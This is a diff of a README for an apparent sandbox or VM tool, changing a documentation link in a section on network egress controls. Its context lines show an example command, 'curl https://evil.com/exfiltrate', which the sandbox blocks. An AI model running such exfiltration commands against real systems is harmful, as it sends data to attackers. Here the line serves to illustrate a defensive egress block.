@@ -250,7 +250,7 @@ vm.run("curl https://api.openai.com/v1/models")    # allowed
 vm.run("curl https://evil.com/exfiltrate")         # blocked
 ```
 
-See [docs/concepts/network-egress-controls.md](docs/concepts/network-egress-controls.md) for how it works under the hood.
+See [docs/guides/networking.md](docs/guides/networking.md) for how it works under the hood.
 
 
 ## Mount host directories
